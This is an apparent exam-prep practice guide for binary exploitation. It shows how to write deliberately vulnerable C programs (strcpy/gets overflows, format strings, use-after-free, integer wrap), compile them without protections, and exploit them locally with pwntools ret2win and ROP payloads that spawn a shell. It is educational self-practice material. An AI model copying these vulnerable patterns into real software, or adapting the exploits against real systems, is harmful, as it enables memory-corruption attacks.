# Creating Your Own Vulnerable Programs - Practice Guide

This guide teaches you how to create, compile, and exploit your own vulnerable programs for practice.

---

## 12.1 Simple Stack Overflow Template

### Basic Template

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

void vuln(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable!
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("win() is at: %p\n", win);
    vuln(argv[1]);
    return 0;
}
```

**Compile:**
```bash
gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow
```

**Exploit:**
```python
from pwn import *
elf = ELF('./overflow')
payload = b'A' * 72 + p64(elf.symbols['win'])
p = process(['./overflow', payload])
p.interactive()
```

---

## 12.2 Variations to Practice

### Variation 1: Different Buffer Sizes

```c
void vuln1(char *input) {
    char buffer[32];   // 32 + 8 = 40 byte offset
    strcpy(buffer, input);
}

void vuln2(char *input) {
    char buffer[128];  // 128 + 8 = 136 byte offset
    strcpy(buffer, input);
}

void vuln3(char *input) {
    char buffer[256];  // 256 + 8 = 264 byte offset
    strcpy(buffer, input);
}
```

**Practice:** Calculate offset for each, verify with GDB

### Variation 2: Multiple Local Variables

```c
void vuln(char *input) {
    int x = 10;
    char buffer[64];
    int y = 20;
    
    strcpy(buffer, input);
    
    printf("x = %d, y = %d\n", x, y);
}
```

**Observation:** See how overflow corrupts adjacent variables

### Variation 3: Read from stdin

```c
void vuln() {
    char buffer[64];
    gets(buffer);  // Reads unlimited input
}

int main() {
    vuln();
    return 0;
}
```

**Exploit:**
```python
p = process('./vuln')
p.sendline(b'A' * 72 + p64(win_addr))
p.interactive()
```

---

## 12.3 ROP Chain Practice

### Program with No Win Function

```c
#include <stdio.h>
#include <string.h>

char binsh[] = "/bin/sh";

void vuln(char *input) {
    char buffer[128];
    strcpy(buffer, input);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("/bin/sh at: %p\n", binsh);
    vuln(argv[1]);
    return 0;
}
```

**Compile with NX:**
```bash
gcc -fno-stack-protector -no-pie rop.c -o rop
```

**Exploit with ROP:**
```python
from pwn import *

elf = ELF('./rop')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']

# Build chain
payload = b'A' * 136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p = process(['./rop', payload])
p.interactive()
```

---

## 12.4 Format String Practice

### Basic Format String

```c
#include <stdio.h>
#include <string.h>

int secret = 0xdeadbeef;
int authenticated = 0;

void check(char *input) {
    char buffer[100];
    
    strncpy(buffer, input, sizeof(buffer)-1);
    
    printf(buffer);  // VULNERABLE!
    printf("\n");
    
    if (authenticated) {
        printf("Access granted!\n");
    }
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("Secret at: %p (value: 0x%x)\n", &secret, secret);
        printf("Authenticated at: %p\n", &authenticated);
        return 1;
    }
    
    check(argv[1]);
    return 0;
}
```

**Exploit - Read Secret:**
```python
from pwn import *

elf = ELF('./fmt')
secret_addr = elf.symbols['secret']

# Read stack
p = process(['./fmt', b'%p ' * 10])
print(p.recvall())

# Read secret
payload = p64(secret_addr) + b'%7$s'
p = process(['./fmt', payload])
print(p.recvall())
```

---

## 12.5 Heap Vulnerabilities

### Use-After-Free

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*func)();
    char data[32];
} Object;

void regular() {
    printf("Regular function\n");
}

void admin() {
    printf("Admin function!\n");
    system("/bin/sh");
}

int main() {
    printf("admin() at: %p\n", admin);
    
    // Allocate object
    Object *obj = malloc(sizeof(Object));
    obj->func = regular;
    strcpy(obj->data, "Hello");
    
    // Call function
    obj->func();
    
    // Free object
    free(obj);
    
    // Allocate new object (reuses memory)
    Object *obj2 = malloc(sizeof(Object));
    obj2->func = admin;
    strcpy(obj2->data, "World");
    
    // Use freed pointer (UAF!)
    printf("\nCalling freed object...\n");
    obj->func();  // Calls admin()!
    
    return 0;
}
```

**Analysis:** See how heap reuse allows hijacking function pointers

---

## 12.6 Integer Overflow to Buffer Overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln(unsigned int size, char *data) {
    char buffer[100];
    
    // Check size
    if (size > 100) {
        printf("Size too large!\n");
        return;
    }
    
    // But signed/unsigned confusion
    printf("Copying %d bytes...\n", (int)size);
    memcpy(buffer, data, size);
    
    printf("Done\n");
}

int main() {
    // Test with wrapped integer
    unsigned int size = (unsigned int)-10;  // Wraps to large value
    
    printf("Size: %u (as unsigned)\n", size);
    printf("Size: %d (as signed)\n", (int)size);
    printf("Check passes: %d\n", size > 100);
    
    char data[200];
    memset(data, 'A', sizeof(data));
    
    vuln(size, data);
    
    return 0;
}
```

---

## 12.7 Progressive Difficulty Challenges

### Challenge 1: Baby Overflow
```c
// Just buffer overflow, win() provided
// Compile: -fno-stack-protector -z execstack -no-pie
char buffer[32];
strcpy(buffer, argv[1]);
```

### Challenge 2: NX Enabled
```c
// Buffer overflow but NX enabled
// Compile: -fno-stack-protector -no-pie
// Must use ROP chain
char buffer[64];
strcpy(buffer, argv[1]);
```

### Challenge 3: Canary Leak
```c
// Has canary, but format string leak available
void vuln(char *input) {
    char buffer[64];
    printf(input);  // Leak canary
    strcpy(buffer, input);  // Overflow with correct canary
}
```

### Challenge 4: ASLR + PIE
```c
// Full ASLR + PIE, need to leak addresses
// Compile: default (all protections)
void vuln(char *input) {
    char buffer[64];
    printf("Buffer at: %p\n", buffer);  // Stack leak
    printf("Input: ");
    strcpy(buffer, input);
}
```

### Challenge 5: Multi-Stage
```c
// Multiple vulnerabilities needed
void stage1() {
    char buffer[32];
    printf("Input: ");
    printf(buffer);  // Format string - leak canary
}

void stage2() {
    char buffer[64];
    gets(buffer);    // Overflow with leaked canary
}
```

---

## 12.8 Testing Your Exploits

### Step-by-Step Testing

**1. Test locally without exploit:**
```bash
./vuln "AAAA"
./vuln "$(python3 -c 'print("A"*100)')"
```

**2. Find crash point:**
```bash
gdb ./vuln
run $(python3 -c 'print("A"*100)')
# Check $rip - should be 0x4141414141414141
```

**3. Find exact offset:**
```python
from pwn import *
print(cyclic(200))
```

```bash
gdb ./vuln
run "$(python3 -c 'from pwn import *; print(cyclic(200))')"
# Check $rip value
cyclic -l 0x<value>  # Get offset
```

**4. Test exploit:**
```python
from pwn import *
elf = ELF('./vuln')
payload = b'A' * offset + p64(elf.symbols['win'])
p = process(['./vuln', payload])
p.interactive()
```

**5. Debug exploit:**
```python
p = gdb.debug(['./vuln', payload], '''
    break vuln
    continue
    x/20x $rsp
''')
```

---

## 12.9 Common Mistakes & Fixes

### Mistake 1: Wrong Offset
```
Symptom: Segfault at wrong address
Fix: Use cyclic pattern, verify in GDB
```

### Mistake 2: Address Not Aligned
```
Symptom: Segfault even with correct address
Fix: Add extra 'ret' gadget before function
payload += p64(ret_gadget)
payload += p64(target)
```

### Mistake 3: stdin vs argv
```
Wrong: process(['./vuln', payload])  # argv
Right: p = process('./vuln')
       p.sendline(payload)  # stdin
```

### Mistake 4: Null Bytes
```
Symptom: Payload truncated
Reason: strcpy stops at \x00
Fix: Put address at END of payload
payload = b'A' * (offset - 8)
payload += p64(address)  # Last
```

---

## 12.10 Creating Challenge Sets

### Template for Practice Problems

```c
/*
 * Challenge X: <Name>
 * 
 * Difficulty: Easy/Medium/Hard
 * 
 * Protections:
 *   - Stack Canary: No
 *   - NX: No
 *   - PIE: No
 *   - ASLR: Disabled
 * 
 * Vulnerability: <Type>
 * Goal: <Objective>
 * 
 * Hints:
 *   - Hint 1
 *   - Hint 2
 * 
 * Compile:
 *   gcc <flags> challenge.c -o challenge
 */

#include <stdio.h>
#include <string.h>

// Your vulnerable code here

int main() {
    // Setup and hints
    return 0;
}
```

### Example Set

1. **Baby Overflow** - strcpy, 64 byte buffer, win() provided
2. **ROP Basics** - strcpy, NX enabled, system() in PLT
3. **Format Leak** - printf(input), leak stack canary
4. **Heap Fun** - UAF with function pointers
5. **Integer Wrap** - size check bypass
6. **Multi-Stage** - Format string + buffer overflow
7. **Full Protections** - All mitigations, requires multiple leaks

---

## 📝 Quick Command Reference

```bash
# Compile variations
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln  # No protections
gcc -fno-stack-protector -no-pie vuln.c -o vuln              # NX only
gcc -no-pie vuln.c -o vuln                                   # NX + Canary
gcc vuln.c -o vuln                                           # Full protections

# Test
./vuln "$(python3 -c 'print("A"*100)')"

# Find offset
gdb ./vuln
run "$(python3 -c 'from pwn import *; print(cyclic(200))')"
cyclic -l <crash_value>

# Exploit
python3 exploit.py

# Debug exploit
python3 -c "from pwn import *; print(gdb.debug(['./vuln', payload]))"
```

---

[← Back to Main](../EXAM-PREP-README.md)
